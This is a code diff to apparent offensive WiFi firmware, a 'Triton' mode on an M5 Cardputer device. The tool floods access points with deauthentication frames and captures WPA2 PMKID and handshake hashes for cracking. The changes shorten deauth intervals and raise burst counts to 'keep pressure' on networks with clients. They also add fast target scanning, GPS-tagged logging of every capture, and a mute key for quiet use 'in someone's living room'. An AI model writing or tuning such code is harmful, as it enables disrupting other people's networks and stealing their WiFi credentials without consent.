@@ -28,6 +28,8 @@
 #include "wifi_types.h"
 #include "wifi_deauth_frame.h"
 #include "../wifi_wardrive.h"
+#include "../gps.h"
+#include "../sfx.h"
 #include <WiFi.h>
 #include <esp_wifi.h>
 #include <SD.h>
@@ -41,6 +43,10 @@ static volatile uint32_t s_born = 0;
 static volatile uint8_t  s_ch    = 1;
 static volatile bool     s_alive = false;
 static File              s_file;
+/* Parallel wardrive-compatible CSV — only opened if GPS has a fix
+ * during the session. Columns mirror wifi_wardrive's output so a
+ * capture session dumps straight into the same WiGLE pipeline. */
+static File              s_wdr_file;
 
 /* ---- modes ---- */
 enum triton_mode_t {
@@ -223,6 +229,30 @@ static void hexcat(char *dst, const uint8_t *src, int n)
     for (int i = 0; i < n; ++i) o += sprintf(dst + o, "%02x", src[i]);
 }
 
+/* Append a wardrive-compatible row for this capture if GPS has a fix.
+ * Column layout matches wifi_wardrive.cpp so post-processing tooling
+ * only has to know one format. Type is EAPOL_PMKID or EAPOL_HS to
+ * distinguish from wardrive's beacon-based BEACON rows. */
+static void wdr_append(const uint8_t *bssid, const char *ssid,
+                       const char *type)
+{
+    gps_fix_t g;
+    if (!gps_snapshot(&g) || !g.valid || g.sats == 0) return;
+    if (!s_wdr_file) {
+        s_wdr_file = sdlog_open("triton-wardrive",
+            "MAC,SSID,AuthMode,FirstSeen,Channel,RSSI,"
+            "CurrentLatitude,CurrentLongitude,AltitudeMeters,"
+            "AccuracyMeters,Type", nullptr, 0);
+        if (!s_wdr_file) return;
+    }
+    s_wdr_file.printf("%02X:%02X:%02X:%02X:%02X:%02X,\"%s\",WPA2,%s,%u,0,"
+                      "%.7f,%.7f,%.1f,%.1f,%s\n",
+                      bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
+                      ssid, g.utc, s_ch,
+                      g.lat_deg, g.lon_deg, g.alt_m, g.hdop, type);
+    s_wdr_file.flush();
+}
+
 static void emit_pmkid(const uint8_t *pmkid, const uint8_t *bssid, const uint8_t *sta)
 {
     char ssid[33]; ssid_of(bssid, ssid, sizeof(ssid));
@@ -236,6 +266,7 @@ static void emit_pmkid(const uint8_t *pmkid, const uint8_t *bssid, const uint8_t
     }
     strcat(line, "***\n");
     capture_enqueue(line);
+    wdr_append(bssid, ssid, "EAPOL_PMKID");
     s_pmk++;
     s_last_catch = millis();
     triton_reward(s_ch);
@@ -264,6 +295,7 @@ static void emit_hs(const uint8_t *bssid, const uint8_t *sta,
     hexcat(line, anonce, 32); strcat(line, "*");
     hexcat(line, m2, m2_len); strcat(line, "*02\n");
     capture_enqueue(line);
+    wdr_append(bssid, ssid, "EAPOL_HS");
     s_hs++;
     s_last_catch = millis();
     triton_reward(s_ch);
@@ -410,13 +442,16 @@ static void hop_task(void *)
         s_visits[s_ch]++;
         esp_wifi_set_channel(s_ch, WIFI_SECOND_CHAN_NONE);
 
-        /* Deauth cadence per mode. STEALTH never transmits. */
+        /* Deauth cadence per mode. STEALTH never transmits. HUNT + STORM
+         * tuned down from earlier 3 s / 1 s to keep pressure on any AP
+         * with active clients — 3 s was too polite and most re-auth
+         * cycles finished before the next burst landed. */
         uint32_t hunt_period = 0;
         switch (s_mode) {
-        case TM_HUNT:     hunt_period = 3000; break;
-        case TM_STORM:    hunt_period = 1000; break;
-        case TM_SURGICAL: hunt_period = 1500; break;
-        case TM_STEALTH:  hunt_period = 0;    break;  /* no deauth */
+        case TM_HUNT:     hunt_period = 1500; break;
+        case TM_STORM:    hunt_period = 700;  break;
+        case TM_SURGICAL: hunt_period = 1200; break;
+        case TM_STEALTH:  hunt_period = 0;    break;
         }
 
         if (hunt_period > 0 && millis() - last_hunt > hunt_period) {
@@ -443,7 +478,7 @@ static void hop_task(void *)
                 nb = cap;
                 portEXIT_CRITICAL(&s_bs_mux);
 
-                int bursts = (s_mode == TM_STORM) ? 4 : 2;
+                int bursts = (s_mode == TM_STORM) ? 6 : 3;
                 for (int i = 0; i < nb && s_alive; ++i) {
                     for (int k = 0; k < bursts; ++k) {
                         wifi_deauth_broadcast(bssids[i], &seq);
@@ -459,14 +494,17 @@ static void hop_task(void *)
          * off the promiscuous RX task. */
         capture_flush();
 
-        /* Dwell per mode. */
+        /* Dwell per mode. STORM bumped from 200 → 450 so each channel
+         * actually sees a couple of beacon cycles (typical cadence is
+         * 100 ms) — 200 ms of random hops was blowing past most APs
+         * without them getting a single beacon in. */
         int dwell_ms;
         switch (s_mode) {
         case TM_SURGICAL: dwell_ms = 1500; break;
-        case TM_STORM:    dwell_ms = 200;  break;
+        case TM_STORM:    dwell_ms = 450;  break;
         case TM_STEALTH:  dwell_ms = 800 + (int)(s_q[s_ch] * 1500); break;
         case TM_HUNT:
-        default:          dwell_ms = 300 + (int)(s_q[s_ch] * 700);  break;
+        default:          dwell_ms = 450 + (int)(s_q[s_ch] * 800);  break;
         }
         delay(dwell_ms);
 
@@ -737,9 +775,45 @@ void feat_triton(void)
         Serial.printf("[triton] seeded %d BSSID->SSID from wardrive\n", seeded);
     }
 
+    /* Fast active scan at entry so Triton doesn't sit with APs: 0 for
+     * 15-30 s waiting for beacons to drift in on the hopped channel.
+     * Synchronous (blocks ~1.2 s) but user-facing much better than
+     * a cold start. Falls back silently if radio isn't ready. */
+    int found = WiFi.scanNetworks(false, true /* show hidden */,
+                                  false /* passive */, 120 /* ms */);
+    if (found > 0) {
+        int seed = 0;
+        portENTER_CRITICAL(&s_bs_mux);
+        for (int i = 0; i < found && s_bs_n < BS_N; ++i) {
+            const uint8_t *bs = WiFi.BSSID(i);
+            if (!bs) continue;
+            /* Dedup: don't re-add a BSSID wardrive already seeded. */
+            bool dup = false;
+            for (int j = 0; j < s_bs_n; ++j) {
+                if (memcmp(s_bs[j].bssid, bs, 6) == 0) { dup = true; break; }
+            }
+            if (dup) continue;
+            memcpy(s_bs[s_bs_n].bssid, bs, 6);
+            String ss = WiFi.SSID(i);
+            strncpy(s_bs[s_bs_n].ssid, ss.c_str(), sizeof(s_bs[s_bs_n].ssid) - 1);
+            s_bs[s_bs_n].ssid[sizeof(s_bs[s_bs_n].ssid) - 1] = 0;
+            s_bs_n++;
+            seed++;
+        }
+        portEXIT_CRITICAL(&s_bs_mux);
+        Serial.printf("[triton] active-scan seeded %d APs\n", seed);
+    }
+    WiFi.scanDelete();
+
     s_ch = 1; s_alive = true;
     s_born = millis();
     s_last_catch = s_born;
+
+    /* Try to open the GPS HAT. If the user's running on Hydra or no
+     * LoRa-1262 is attached, gps_begin() returns false and we just
+     * skip the wardrive CSV. Works without a fix too — emit_pmkid /
+     * emit_hs check sats > 0 before writing a wardrive row. */
+    gps_begin();
 
     esp_wifi_set_promiscuous(true);
     esp_wifi_set_promiscuous_rx_cb(cb);
@@ -758,7 +832,7 @@ void feat_triton(void)
     uint32_t last_c5_deauth = 0;
     int c5_target_idx = 0;
 
-    ui_draw_footer("he does it himself. `=back");
+    ui_draw_footer("autonomous  [M]=mute  [?]=help  `=back");
 
     uint32_t last_draw = 0;
     uint32_t last_mood = 0;
@@ -780,12 +854,13 @@ void feat_triton(void)
             prev_hs = s_hs;
             char sub[48];
             snprintf(sub, sizeof(sub), "total: %lu", (unsigned long)total);
+            /* sfx_capture is the full POSEIDON "caught one" jingle —
+             * respects the global mute flag, so the [M] hotkey below
+             * silences it mid-session without losing the overlay. */
+            sfx_capture();
             if (was_hs) {
-                M5Cardputer.Speaker.tone(1200, 100);
                 ui_action_overlay("HANDSHAKE!", sub, ACT_BG_WAVES, 0xF81F, 1400);
-                M5Cardputer.Speaker.tone(2400, 160);
             } else {
-                M5Cardputer.Speaker.tone(1800, 80);
                 ui_action_overlay("PMKID", sub, ACT_BG_RADAR, 0x07FF, 900);
             }
             (void)diff;
@@ -901,10 +976,21 @@ void feat_triton(void)
         if (k == PK_NONE) { delay(20); continue; }
         if (k == PK_ESC) break;
         if (k == '?') { ui_show_current_help(); }
+        if (k == 'm' || k == 'M') {
+            /* Toggle global SFX mute in-session. Captures keep firing
+             * — just without the jingle — for when you're hunting in
+             * someone's living room and don't want POSEIDON chirping
+             * "HANDSHAKE!" every two minutes. */
+            bool m = !sfx_is_muted();
+            sfx_set_mute(m);
+            ui_toast(m ? "muted" : "sound on", m ? T_WARN : T_GOOD, 600);
+        }
     }
 
     s_alive = false;
     esp_wifi_set_promiscuous(false);
-    if (s_file) { s_file.flush(); s_file.close(); }
+    if (s_file)     { s_file.flush();     s_file.close(); }
+    if (s_wdr_file) { s_wdr_file.flush(); s_wdr_file.close(); }
+    gps_end();
     delay(200);
 }
